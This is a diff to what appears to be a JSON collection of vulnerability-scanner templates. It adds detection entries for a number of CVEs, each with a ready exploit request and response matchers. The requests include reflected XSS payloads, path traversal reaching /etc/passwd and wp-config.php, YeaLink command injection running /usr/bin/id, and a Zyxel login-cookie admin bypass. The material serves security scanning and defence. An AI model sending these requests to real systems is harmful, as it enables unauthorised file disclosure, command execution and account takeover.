@@ -645,6 +645,48 @@
       ]
     },
     {
+      "id": "CVE-2011-4336",
+      "info": {
+        "author": "pikpikcu",
+        "description": "Tiki Wiki CMS Groupware 7.0 has XSS via the GET \"ajax\" parameter to snarf_ajax.php.",
+        "name": "Tiki Wiki CMS Groupware 7.0 has XSS",
+        "reference": "- https://nvd.nist.gov/vuln/detail/CVE-2011-4336\n- https://www.securityfocus.com/bid/48806/info\n- https://seclists.org/bugtraq/2011/Nov/140\n",
+        "severity": "medium",
+        "tags": "cve,cve2011,xss,tikiwiki"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/snarf_ajax.php?url=1&ajax=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2011-4618",
       "info": {
         "author": "daffainfo",
@@ -1308,6 +1350,40 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/?page_id=2&%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2012-4253",
+      "info": {
+        "author": "daffainfo",
+        "description": "Multiple directory traversal vulnerabilities in MySQLDumper 1.24.4 allow remote attackers to read arbitrary files via a .. (dot dot) in the (1) language parameter to learn/cubemail/install.php or (2) f parameter learn/cubemail/filemanagement.php, or execute arbitrary local files via a .. (dot dot) in the (3) config parameter to learn/cubemail/menu.php.",
+        "name": "MySQLDumper 1.24.4 - Directory Traversal",
+        "reference": "- https://www.exploit-db.com/exploits/37129\n- https://www.cvedetails.com/cve/CVE-2012-4253\n",
+        "severity": "high",
+        "tags": "cve,cve2012,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/learn/cubemail/filemanagement.php?action=dl&f=../../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -2405,6 +2481,45 @@
       ]
     },
     {
+      "id": "CVE-2014-8799",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the dp_img_resize function in php/dp-functions.php in the DukaPress plugin before 2.5.4 for WordPress allows remote attackers to read arbitrary files via a .. (dot dot) in the src parameter to lib/dp_image.php.",
+        "name": "WordPress Plugin DukaPress 2.5.2 - Directory Traversal",
+        "reference": "- https://www.exploit-db.com/exploits/35346\n- https://www.cvedetails.com/cve/CVE-2014-8799\n",
+        "severity": "high",
+        "tags": "cve,cve2014,wordpress,wp-plugin,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "DB_NAME",
+                "DB_PASSWORD",
+                "DB_USER",
+                "DB_HOST"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/dukapress/lib/dp_image.php?src=../../../../wp-config.php"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2014-9094",
       "info": {
         "author": "daffainfo",
@@ -2596,7 +2711,7 @@
           "matchers-condition": "and",
           "method": "POST",
           "path": [
-            "{{BaseURL}}/"
+            "{{BaseURL}}"
           ]
         }
       ]
@@ -3616,6 +3731,88 @@
       ]
     },
     {
+      "id": "CVE-2016-1000148",
+      "info": {
+        "author": "daffainfo",
+        "name": "S3 Video Plugin <= 0.983 - Unauthenticated Reflected Cross-Site Scripting (XSS)",
+        "reference": "- https://wpscan.com/vulnerability/ead796ed-202a-451f-b041-d39c9cf1fb54\n- https://nvd.nist.gov/vuln/detail/CVE-2016-1000148\n",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,wp-plugin,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script><\""
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/s3-video/views/video-management/preview_video.php?media=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3C%22"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-1000149",
+      "info": {
+        "author": "daffainfo",
+        "name": "Simpel Reserveren 3 <= 3.5.2 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000149",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/simpel-reserveren/edit.php?page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2016-1000152",
       "info": {
         "author": "daffainfo",
@@ -3816,6 +4013,47 @@
           "method": "POST",
           "path": [
             "{{BaseURL}}/wp-content/plugins/wsecure/wsecure-config.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-10993",
+      "info": {
+        "author": "daffainfo",
+        "name": "ScoreMe Theme - Unauthenticated Reflected Cross-Site Scripting (XSS)",
+        "reference": "- https://www.vulnerability-lab.com/get_content.php?id=1808\n- https://nvd.nist.gov/vuln/detail/CVE-2016-10993\n",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,wp-theme,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?s=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -5167,6 +5405,15 @@
       },
       "requests": [
         {
+          "extractors": [
+            {
+              "part": "body",
+              "regex": [
+                "\"name\":\"[^\"]*\""
+              ],
+              "type": "regex"
+            }
+          ],
           "matchers": [
             {
               "part": "header",
@@ -5972,6 +6219,48 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vulntest%27,%20version=%271%27)%0aimport%20Payload;"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-10095",
+      "info": {
+        "author": "pikpikcu",
+        "description": "Cross-site scripting (XSS) vulnerability in Dolibarr before 7.0.2 allows remote attackers to inject arbitrary web script or HTML via the foruserlogin parameter to adherents/cartes/carte.php.\n",
+        "name": "Dolibarr before 7.0.2 allows XSS.",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-10095",
+        "severity": "medium",
+        "tags": "cve,cve2018,xss,dolibarr"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/dolibarr/adherents/cartes/carte.php?&mode=cardlogin&foruserlogin=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&model=5160&optioncss=print"
           ]
         }
       ]
@@ -7798,7 +8087,7 @@
           "matchers-condition": "and",
           "method": "GET",
           "path": [
-            "{{BaseURL}}/"
+            "{{BaseURL}}"
           ]
         }
       ]
@@ -7832,6 +8121,48 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/pages/includes/status-list-mo%3CIFRAME%20SRC%3D%22javascript%3Aalert%281337%29%22%3E.vm"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-5233",
+      "info": {
+        "author": "pikpikcu",
+        "description": "Cross-site scripting (XSS) vulnerability in system/src/Grav/Common/Twig/Twig.php in Grav CMS before 1.3.0 allows remote attackers to inject arbitrary web script or HTML via the PATH_INFO to admin/tools.\n",
+        "name": "Grav CMS before 1.3.0 allows XSS.",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-5233",
+        "severity": "medium",
+        "tags": "cve,cve2018,xss,grav"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/admin/tools/a--%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -14475,6 +14806,42 @@
       ]
     },
     {
+      "id": "CVE-2020-27361",
+      "info": {
+        "author": "gy741",
+        "description": "An issue exists within Akkadian Provisioning Manager 4.50.02 which allows attackers to view sensitive information within the /pme subdirectories.",
+        "name": "Akkadian Provisioning Manager - Files Listing",
+        "reference": "https://www.blacklanternsecurity.com/2021-07-01-Akkadian-CVE/",
+        "severity": "high",
+        "tags": "cve,cve2020,akkadian,listing,exposure"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "Index of /pme/media",
+                "Parent Directory"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/pme/media/"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-27735",
       "info": {
         "author": "pikpikcu",
@@ -15076,6 +15443,40 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/searchblox/servlet/FileServlet?col=9&url=/etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-35598",
+      "info": {
+        "author": "daffainfo",
+        "description": "ACS Advanced Comment System 1.0 is affected by Directory Traversal via an advanced_component_system/index.php?ACS_path=..%2f URI.",
+        "name": "Advanced Comment System 1.0 - Path Traversal",
+        "reference": "- https://www.exploit-db.com/exploits/49343\n- https://www.cvedetails.com/cve/CVE-2020-35598\n",
+        "severity": "high",
+        "tags": "cve,cve2020,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/advanced_component_system/index.php?ACS_path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00"
           ]
         }
       ]
@@ -17673,6 +18074,44 @@
       ]
     },
     {
+      "id": "CVE-2021-21816",
+      "info": {
+        "author": "gy741",
+        "description": "An information disclosure vulnerability exists in the Syslog functionality of D-LINK DIR-3040 1.13B03. A specially crafted network request can lead to the disclosure of sensitive information. An attacker can send an HTTP request to trigger this vulnerability.",
+        "name": "D-LINK DIR-3040 - Syslog Information Disclosure",
+        "reference": "https://talosintelligence.com/vulnerability_reports/TALOS-2021-1281",
+        "severity": "medium",
+        "tags": "cve,cve2021,dlink,exposure,router"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "syslog:",
+                "admin",
+                "/etc_ro/lighttpd/www"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/messages"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-21972",
       "info": {
         "author": "dwisiswant0",
@@ -19116,6 +19555,59 @@
       ]
     },
     {
+      "id": "CVE-2021-27561",
+      "info": {
+        "author": "shifacyclewala,hackergautam",
+        "description": "A malicious actor can trigger Unauthenticated Remote Code Execution",
+        "name": "YeaLink DM PreAuth RCE",
+        "reference": "https://ssd-disclosure.com/ssd-advisory-yealink-dm-pre-auth-root-level-rce/",
+        "severity": "critical",
+        "tags": "cve,cve2021,rce,yealink"
+      },
+      "requests": [
+        {
+          "extractors": [
+            {
+              "regex": [
+                "(u|g)id=.*"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "uid",
+                "gid",
+                "groups"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/json"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/premise/front/getPingData?url=http://0.0.0.0:9600/sm/api/v1/firewall/zone/services?zone=;/usr/bin/id;"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-27651",
       "info": {
         "author": "idealphase",
@@ -19641,6 +20133,7 @@
       "id": "CVE-2021-29203",
       "info": {
         "author": "madrobot",
+        "description": "A security vulnerability has been identified in the HPE Edgeline Infrastructure Manager, also known as HPE Edgeline Infrastructure Management Software, prior to version 1.22. The vulnerability could be remotely exploited to bypass remote authentication leading to execution of arbitrary commands, gaining privileged access, causing denial of service, and changing the configuration. HPE has released a software update to resolve the vulnerability in the HPE Edgeline Infrastructure Manager.",
         "name": "HPE Edgeline Infrastructure Manager v1.21 Authentication Bypass",
         "reference": "- https://www.tenable.com/security/research/tra-2021-15\n- https://nvd.nist.gov/vuln/detail/CVE-2021-29203\n",
         "severity": "critical",
@@ -19765,6 +20258,48 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/nacos/v1/cs/ops/derby?sql=select+st.tablename+from+sys.systables+st"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-29484",
+      "info": {
+        "author": "rootxharsh,iamnoooob",
+        "description": "Ghost is a Node.js CMS. An unused endpoint added during the development of 4.0.0 has left sites vulnerable to untrusted users gaining access to Ghost Admin. Attackers can gain access by getting logged in users to click a link containing malicious code. Users do not need to enter credentials and may not know they've visited a malicious site.",
+        "name": "DOM XSS in Ghost CMS",
+        "reference": "- https://github.com/TryGhost/Ghost/security/advisories/GHSA-9fgx-q25h-jxrg\n- https://nvd.nist.gov/vuln/detail/CVE-2021-29484\n",
+        "severity": "medium",
+        "tags": "cve,cve2021,xss,ghost"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "XMLHttpRequest.prototype.open"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/ghost/preview"
           ]
         }
       ]
@@ -19926,6 +20461,7 @@
       "id": "CVE-2021-30497",
       "info": {
         "author": "gy741",
+        "description": "A directory traversal vulnerability in Ivanti Avalanche allows remote unauthenticated user to access files that reside outside the 'image' folder",
         "name": "Ivanti Avalanche Directory Traversal",
         "reference": "https://ssd-disclosure.com/ssd-advisory-ivanti-avalanche-directory-traversal/",
         "severity": "high",
@@ -20265,6 +20801,42 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/?layout=/etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-3297",
+      "info": {
+        "author": "gy741",
+        "description": "On Zyxel NBG2105 V1.00(AAGU.2)C0 devices, setting the login cookie to 1 provides administrator access.",
+        "name": "Zyxel NBG2105 V1.00(AAGU.2)C0 - Authentication Bypass",
+        "reference": "- https://nvd.nist.gov/vuln/detail/CVE-2021-3297\n- https://github.com/nieldk/vulnerabilities/blob/main/zyxel%20nbg2105/Admin%20bypass\n",
+        "severity": "high",
+        "tags": "cve,cve2021,zyxel,auth-bypass,router"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "Running Time",
+                "Firmware Version",
+                "Firmware Build Time"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /status.htm HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\ncookie: language=en; login=1\n"
           ]
         }
       ]
